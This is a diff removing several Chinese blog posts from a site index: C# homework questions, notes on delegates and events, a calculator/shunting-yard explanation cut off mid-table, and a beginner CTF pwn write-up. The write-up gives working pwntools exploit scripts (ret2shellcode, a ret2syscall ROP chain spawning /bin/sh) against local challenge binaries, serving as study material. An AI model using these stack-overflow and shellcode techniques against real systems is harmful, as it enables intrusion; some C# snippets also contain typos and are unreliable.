@@ -96,483 +96,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C艹基础（1）</title>
-    <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="信息系统开发（-NET）-第八章作业"><a href="#信息系统开发（-NET）-第八章作业" class="headerlink" title="信息系统开发（.NET）   第八章作业"></a>信息系统开发（.NET）   第八章作业</h1><h2 id="什么是类的继承？怎么定义派生类？"><a href="#什么是类的继承？怎么定义派生类？" class="headerlink" title="什么是类的继承？怎么定义派生类？"></a>什么是类的继承？怎么定义派生类？</h2><h2 id="简述创建派生类时，构造函数的调用。"><a href="#简述创建派生类时，构造函数的调用。" class="headerlink" title="简述创建派生类时，构造函数的调用。"></a>简述创建派生类时，构造函数的调用。</h2><h2 id="怎样定义基类虚方法，并在派生类中重写基类虚方法？"><a href="#怎样定义基类虚方法，并在派生类中重写基类虚方法？" class="headerlink" title="怎样定义基类虚方法，并在派生类中重写基类虚方法？"></a>怎样定义基类虚方法，并在派生类中重写基类虚方法？</h2><h2 id="抽象方法和虚方法有什么异同？"><a href="#抽象方法和虚方法有什么异同？" class="headerlink" title="抽象方法和虚方法有什么异同？"></a>抽象方法和虚方法有什么异同？</h2><h2 id="什么是抽象类？它有什么特点？它和接口有何异同？"><a href="#什么是抽象类？它有什么特点？它和接口有何异同？" class="headerlink" title="什么是抽象类？它有什么特点？它和接口有何异同？"></a>什么是抽象类？它有什么特点？它和接口有何异同？</h2><h2 id="简述通过委托来调用对象方法的基本过程。"><a href="#简述通过委托来调用对象方法的基本过程。" class="headerlink" title="简述通过委托来调用对象方法的基本过程。"></a>简述通过委托来调用对象方法的基本过程。</h2>]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>c#</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pwn题解</title>
-    <url>/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="从0开始的Pwn生活"><a href="#从0开始的Pwn生活" class="headerlink" title="从0开始的Pwn生活"></a>从0开始的Pwn生活</h1><p>与其说是题解，不如说是萌新初次见面的哦哈呦</p>
-<h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><p>没得说，复习的时候再写</p>
-<p>更权威的查找后门函数方法：</p>
-<ol>
-<li>ctrl + F搜索 system</li>
-<li>shift + F12看有没有字符串 &#x2F;bin&#x2F;sh</li>
-</ol>
-<h1 id="Ret2ShellCode"><a href="#Ret2ShellCode" class="headerlink" title="Ret2ShellCode"></a>Ret2ShellCode</h1><h4 id="第一次的思路"><a href="#第一次的思路" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203338698.png" alt="image-20241124203338698">	</p>
-<p>保护 &#x3D;  ZERO</p>
-<p>32位</p>
-<h5 id="IDA下静态调试"><a href="#IDA下静态调试" class="headerlink" title="IDA下静态调试"></a>IDA下静态调试</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203655566.png" alt="image-20241124203655566"> </p>
-<p>setvbuf是清空缓冲区。简单来说就是说不要设置输入输出缓冲区，不然没满发不出去。</p>
-<p>这个gets很关键，基本判别是溢出解法。</p>
-<p>执行内容位把s的值赋给buf2</p>
-<p>让我们查看下buf2的位置</p>
-<p>​                                                                                                                                                                                                                                                                                                                                                                                             </p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124204040843.png" alt="image-20241124204040843">                                                                                                                                                                           </p>
-<p>bss区域是可执行的，只需要在这里覆盖上我们需要执行的代码就好了</p>
-<p>返回地址覆盖位这个bss的地址</p>
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213147737.png" alt="image-20241124213147737" style="zoom: 33%;">	
-
-<p>所以我猜测应该是覆盖strcpy的返回地址到buf2数组的地址，数组内容应该是&#x2F;bin&#x2F;sh对应的机器码</p>
-<p>payload &#x3D; 0x64+4的无效数据加上&#x2F;bin&#x2F;sh的机器码</p>
-<h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>s是一个局部变量，gets可以将任意长度的字符赋值给s。当输入过长时，一直向高地址溢出可能覆盖main函数的返回地址。所以溢出的栈帧应该是main函数的栈帧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213831067.png" alt="image-20241124213831067"> </p>
-<p>这里看到，距离ebp刚好是100字节。</p>
-<p>ebp指向的是栈底，紧随其后的就是previous ebp，再往后面就是return address了</p>
-<p>不过静态调试分析不一定正确，题目可能有灵活性。此时需要动态调试。动态才是真正的实践出真知。</p>
-<h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>gets输入后直接看栈内容</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124214947632.png" alt="image-20241124214947632"> </p>
-<p>首先第一行，esp。它的意思是，这里存的是一个指针，AAAA是这个指针存的内容</p>
-<p>AAAA实际的位置在cddc处</p>
-<p>向上查看寄存器ebp的值              </p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124215221005.png" alt="image-20241124215221005"> </p>
-<p>从eax到ebp就是应该填充的数组的值，然后再用4字节垃圾数据填充掉previous ebp，最后覆盖返回地址即可</p>
-<p><strong>结果地址差是108，并非100</strong>。这是为什么？</p>
-<h5 id="写攻击脚本"><a href="#写攻击脚本" class="headerlink" title="写攻击脚本"></a>写攻击脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>ljust(int n,char c) 前方字节流不变，后方补充数据C直到到达n个字节</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124223816018.png" alt="image-20241124223816018"> </p>
-<p>这不对啊 :question:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241125105258338.png" alt="image-20241125105258338"> </p>
-<p>仔细一看，bss段竟然没有可执行权限。这和说好的不一样啊</p>
-<p>破案了，LInux内核问题，不用纠结这题就是这样做的。</p>
-<p>当然也可以用mprotect函数或者换到Ubuntu 18以下的版本</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>动态调试和静态分析的结果可能有区别，一切按照动态调试的来。所以找长度的时候出了错</p>
-<p>另外需要通过pwntools来生成shellcode的机器码</p>
-<h1 id="NewStarCTF-公开赛赛道-ret2shellcode"><a href="#NewStarCTF-公开赛赛道-ret2shellcode" class="headerlink" title="[NewStarCTF 公开赛赛道] ret2shellcode"></a>[NewStarCTF 公开赛赛道] ret2shellcode</h1><h4 id="第一次的思路-1"><a href="#第一次的思路-1" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126203800780.png" alt="image-20241126203800780">	</p>
-<p>没有Canary保护的话，将返回地址覆盖是可行的。应该还是传统栈溢出。</p>
-<p>注意是64位</p>
-<h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126200304228.png" alt="image-20241126200304228"> </p>
-<p>关键有三步，第一步有一个mmap函数（这是啥我不知道），第二步向buf数组<strong>标准输入</strong>0x100字节的数据，第三步向v4数组标准输入0x100字节的数据。ULL后缀目的是确保编译器正确解析该数字的类型。</p>
-<p><strong>read和gets的区别在于：</strong></p>
-<p><code>read</code>需要指定读取长度，可以避免缓冲区溢出；<code>gets</code>读取输入直到\n出现，会导致缓冲区溢出</p>
-<p><code>read</code>需要手动处理读取的字节并在缓冲区末尾添加\0形成字符串；<code>gets</code>自动在字符串末尾田间空字符\0形成字符串</p>
-<p>百度一下：<code>mmap</code> </p>
-<p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a></p>
-<p>**内存映射：**简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，同样，内核空间对这段区域的修改也直接反映用户空间。</p>
-<p><code>mmap</code>是一种<strong>内存映射文件的方法</strong>，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p>
-<p><strong>函数原型</strong>：<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
-<p>start：映射区的开始地址</p>
-<p>length：映射区的长度</p>
-<p>prot：期望的内存保护标志</p>
-<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享</p>
-<p>fd：有效的文件描述词</p>
-<p>offset：被映射对象内容的起点</p>
-<p>这个时候第一步就清楚了，即将buf映射到一个4096字节的内存，其起始地址为虚拟地址0x233000，且该内存空间<strong>可读可写可执行</strong>（省略了动态分析vmmap没发现有rwx段）</p>
-<p>找到可读可写可执行，思路一下子就清晰了，将shellcode通过buf数组映射到这个虚拟空间，然后通过v4覆盖返回地址，覆盖的返回地址恰好为这个映射区的起始地址。<del>对还是不对？</del></p>
-<p>那么第一次写入的数据就是shellcode &#x3D; asm(shellcraft.sh())</p>
-<p>第二次写入的数据便为(0x30+8)的垃圾数据加上p64(0x233000)</p>
-<p>发现一个小问题，这里会把 buf覆盖掉吗 （buf[]的首地址），覆盖了会有影响吗。</p>
-<h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">addr = <span class="number">0x233000</span></span><br><span class="line">payload = (<span class="number">0x30</span>+<span class="number">8</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0x233000</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126205924180.png" alt="image-20241126205924180">	</p>
-<p>卧槽，你浩锅，直接过了</p>
-<p>也是第一次没看提示解出来一道pwn题（抛开查了查mmap函数不谈）</p>
-<h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><h4 id="哈吉咩得"><a href="#哈吉咩得" class="headerlink" title="哈吉咩得"></a>哈吉咩得</h4><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143917697.png" alt="image-20241128143917697"> </p>
-<p>32位，无保护，栈溢出</p>
-<h5 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144009902.png" alt="image-20241128144009902"> </p>
-<p>通过v4数组覆盖main函数的返回地址</p>
-<p>其长度为0x64+4</p>
-<p>而且这次没有后门函数也不能注入shellcode。考虑ROP，系统调用</p>
-<h5 id="找到gadget地址"><a href="#找到gadget地址" class="headerlink" title="找到gadget地址"></a>找到gadget地址</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144400349.png" alt="image-20241128144400349"> </p>
-<p>首先想想&#x2F;bin&#x2F;sh得系统调用流程是什么</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144455036.png" alt="image-20241128144455036"> </p>
-<p>于是我们需要得分别有</p>
-<p><code>pop eax；ret</code>	地址0x080bb196</p>
-<p><code>pop ebx；ret</code>	地址0x0804838e</p>
-<p>关于ecx和edx应该需要清空一下的吧。但是这里如果pop，ret感觉很麻烦。但找不到xor，ret就算了</p>
-<p>所以</p>
-<p> <code>xor ecx，ecx；ret</code>   或者 pop ret	地址</p>
-<p><code>xor edx，edx；ret</code>  或者  pop ret</p>
-<p><code>int 0x80</code></p>
-<p>这些是我们需要的gadget。</p>
-<p>但事实上发现只有xor eax，eax，所以ecx，edx应该是不需要怎么管的。</p>
-<h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><p>pop的东东是栈顶元素，即esp指向的数。而v4数组在esp的上方。说明没办法通过v4来修改esp指向内容的值啊。</p>
-<p>那该怎么办。</p>
-<p>唐了，记住esp一直指向栈顶。</p>
-<h4 id="正确思路-1"><a href="#正确思路-1" class="headerlink" title="正确思路"></a>正确思路</h4><h5 id="寻找后门函数"><a href="#寻找后门函数" class="headerlink" title="寻找后门函数"></a>寻找后门函数</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128150557112.png" alt="image-20241128150557112"> </p>
-<p>尝试了两种方法（第一题），只找到了字符串（后门函数对应的参数），但没找到后门函数（system）。</p>
-<h5 id="找gadget"><a href="#找gadget" class="headerlink" title="找gadget"></a>找gadget</h5><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code>找到第一个gadget。其他以此类推</p>
-<p>ecx和edx其实第一次构建payload的时候无需在意。因为一般情况下这个时候ecx和edx为0。可以先试试看，如果有问题再说。</p>
-<p>这里找到两个gadget：</p>
-<p>0x080bb196 : pop eax ; ret</p>
-<p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p>
-<p>找不到的就替代。</p>
-<p>最后 0x08049421 : int 0x80</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128152855316.png" alt="image-20241128152855316"> </p>
-<p>从下到上得看</p>
-<h5 id="动态调试尝试覆盖原有返回地址"><a href="#动态调试尝试覆盖原有返回地址" class="headerlink" title="动态调试尝试覆盖原有返回地址"></a>动态调试尝试覆盖原有返回地址</h5><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101348955.png" alt="image-20241129101348955"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101419976.png" alt="image-20241129101419976"> </p>
-<p>这又是一道动态调试和静态分析结果不相同得一道题。结果需要注入（0x88-0x1c+4）的垃圾数据</p>
-<h5 id="构建payload，编写exp"><a href="#构建payload，编写exp" class="headerlink" title="构建payload，编写exp"></a>构建payload，编写exp</h5><p><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</p>
-<p><code>payload = flat([b&#39;A&#39;*(112),pop_eax_addr, 0xb , pop_edx_ecx_ebx_addr, 0 , 0 , 0x80be408, int80_addr])</code></p>
-<p>以下为exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">int80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>), pop_eax_addr , <span class="number">0xb</span>,pop_edx_ecx_ebx_addr, <span class="number">0</span>,<span class="number">0</span>,binsh, int80_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>64位下遵循传参规则：</p>
-<p>H(a, b, c, d, e, f, g, h);<br>a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9<br>h-&gt;8(%esp)<br>g-&gt;(%esp)<br>call H</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>Pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>c艹事件</title>
-    <url>/2024/12/09/c-%E4%BA%8B%E4%BB%B6/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="委托与事件"><a href="#委托与事件" class="headerlink" title="委托与事件"></a>委托与事件</h1><h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>实际上用类完成了函数指针的功能</p>
-<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">Print</span>(<span class="params"><span class="built_in">int</span> x</span>)  <span class="comment">//只能在namespace和类下</span></span></span><br></pre></td></tr></table></figure>
-
-<h4 id="初始化，赋值"><a href="#初始化，赋值" class="headerlink" title="初始化，赋值"></a>初始化，赋值</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Print someFunc = hello；</span><br><span class="line">Print someFunc = <span class="keyword">new</span> Print(hello); </span><br></pre></td></tr></table></figure>
-
-<h4 id="调用委托变量"><a href="#调用委托变量" class="headerlink" title="调用委托变量"></a>调用委托变量</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">someFunc(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">PrintInt</span>(<span class="params"><span class="built_in">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Hello</span>(<span class="params"><span class="built_in">int</span> x</span>)</span> =&gt; Console.WriteLIne(<span class="string">$&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">PrintINt writeInt = Hello(<span class="number">354</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h2><p>多播委托将多个函数对象分配到一个委托示例</p>
-<p>委托的分配动作是通过 +&#x3D; 、-&#x3D; 完成的（可以用&#x3D;。 事件不能用&#x3D;）</p>
-<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>事件是一种特殊的委托</p>
-<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>事件拥有者，事件成员，事件相应者，事件处理器，事件订阅</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241209223501574.png" alt="image-20241209223501574"></p>
-<p>主流理解是将代码分为两个部分：事件发布者（广播者）和事件订阅者（订阅者）</p>
-<p>简称SB模式</p>
-<p>最大的好处是不能赋值。</p>
-<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol>
-<li>在类中定义私有化委托</li>
-<li>暴露出-&#x3D;、+&#x3D;的方法</li>
-</ol>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">FuncHandler</span>(<span class="params"><span class="built_in">int</span> item</span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Broadcaster</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">event</span> FuncHandler funcHandler; <span class="comment">//事件的声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="事件的标准写法"><a href="#事件的标准写法" class="headerlink" title="事件的标准写法"></a>事件的标准写法</h3><ol>
-<li><p>命名事件的委托必须以EventHandler结尾</p>
-</li>
-<li><p>触发函数必须以On开头，且必须是虚函数</p>
-</li>
-<li><p>订阅者（+&#x3D;、-&#x3D;）函数的类型符合EventHandler委托类型</p>
-<ol>
-<li><p>接收两个参数（object arg1， SomeEventArgs arg2）</p>
-<p>​    arg1 表示广播者</p>
-<p>​    arg2 参数为EventArgs的子类 表示传播信息</p>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> str</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> MyDelegate MyEvent;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnEventHappend</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    MyEvent?.Invoke(<span class="string">&quot;happened&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Display</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">//1. 定义一个事件，然后把这个事件注册到某个响应上</span></span><br><span class="line">    MyEvent += Display  <span class="comment">//会输出happened</span></span><br><span class="line">    Peoople p = <span class="keyword">new</span> People();</span><br><span class="line">    MyEvent += p.PeopleResponed;</span><br><span class="line">    OnEventHappend();<span class="comment">//事件的触发</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AnimalRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)	<span class="comment">//效应</span></span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;Animal Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">People</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PeopleRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    	Console.WriteLine(<span class="string">&quot;People Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>c#</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算器原理</title>
-    <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算器原理"><a href="#计算器原理" class="headerlink" title="计算器原理"></a>计算器原理</h1><p>计算器计算的表达式是后缀表达式。</p>
-<p>我们输入一个表达式，计算器给出结果主要经过了：将中缀表达式转化为后缀表达式，计算后缀表达式这两个过程</p>
-<p>而转化和计算过程运用到了数据结构“栈”。</p>
-<p>我们为了简化过程，在转化后缀表达式过程中进行中间结果的计算。</p>
-<h3 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h3><blockquote>
-<p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">中缀表示法 - 维基百科，自由的百科全书</a></p>
-</blockquote>
-<p>中缀表达法是自然语言的写法，其操作符在操作数的中间</p>
-<p>如3+4</p>
-<h3 id="后缀表达式（逆波兰表示法）"><a href="#后缀表达式（逆波兰表示法）" class="headerlink" title="后缀表达式（逆波兰表示法）"></a>后缀表达式（逆波兰表示法）</h3><blockquote>
-<p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波兰表示法 - 维基百科，自由的百科全书</a></p>
-</blockquote>
-<p>即所有操作符在操作数的后面。</p>
-<h5 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h5><ol>
-<li>从左到右扫描表达式</li>
-<li>遇到数字时，将数字压入堆栈</li>
-<li>遇到运算符时<ul>
-<li>弹出栈顶的两个数（栈顶和次顶），用运算符对它们做对应的计算，并将结果入栈</li>
-<li>计算顺序是： 后弹出来的  （运算符）  先弹出来的</li>
-</ul>
-</li>
-</ol>
-<h3 id="调度场算法"><a href="#调度场算法" class="headerlink" title="调度场算法"></a>调度场算法</h3><blockquote>
-<p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">调度场算法 - 维基百科，自由的百科全书</a></p>
-</blockquote>
-<p>将中缀表达式转化为后缀表达式的算法。</p>
-<p>为了方便快速计算，我们使用两个栈：运算符栈s1和操作数栈s2。操作数栈其实也可以看作中间结果栈。</p>
-<p>在操作数压栈过程中，直接入栈即可。</p>
-<p>在运算符压栈过程中，需要保持栈顶运算符为当前优先级最高的。换言之就是比当前栈内运算符优先级高的运算符已经完成了运算操作。</p>
-<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;">
-
-<h5 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h5><ol>
-<li><p>初始化两个栈：</p>
-<ul>
-<li>运算符栈：s1</li>
-<li>中间结果栈：s2</li>
-</ul>
-</li>
-<li><p>从左到右扫描中缀表达式</p>
-</li>
-<li><p>遇到操作数时，将其压入s2</p>
-</li>
-<li><p>遇到运算符时</p>
-<ul>
-<li>比较它和s1栈顶运算符的优先级：<ul>
-<li>如果s1为空或者栈顶运算符符号为（，则将其压入符号栈s1</li>
-<li>如果优先级比栈顶运算符高，也将其压入符号栈s1</li>
-<li>如果优先级比栈顶运算符低或相等，将s1栈顶的运算符弹出，并压入到s2中。</li>
-</ul>
-</li>
-<li>再重复比较它和新栈顶运算符的优先级。</li>
-</ul>
-<blockquote>
-<p>[!NOTE]</p>
-<p>重复的含义：</p>
-<ol>
-<li><p>如果s1栈顶元素符号优先级比当前符号高或者等于，那么就将其弹出压入s2中（循环做，只要s1不为空）。</p>
-<p>如果栈顶符号为 （ ，其优先级最低，就不会弹出，就跳出循环了。</p>
-</li>
-<li><p>跳出循环后，则将当前符号压入s1</p>
-</li>
-</ol>
-</blockquote>
-</li>
-<li><p>遇到括号时：</p>
-<ul>
-<li>如果是左括号（ ：则直接压入s1</li>
-<li>如果是右括号  ）：则以此弹出s1栈顶的运算符，并压入s2，知道遇到左括号为止，此时将这一对括号丢弃。</li>
-</ul>
-</li>
-<li><p>重复步骤2~5，直到表达式最右端。</p>
-</li>
-<li><p>将s1中的运算符以此弹出并压入 s2。</p>
-</li>
-<li><p>以此弹出 s2 中的元素并输出，结果的 逆序 即为：中缀表达式转为后缀表达式。</p>
-</li>
-</ol>
-<h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1+((2+3)*4)-5	</span><br></pre></td></tr></table></figure>
-
-
-
-<table>
-<thead>
-<tr>
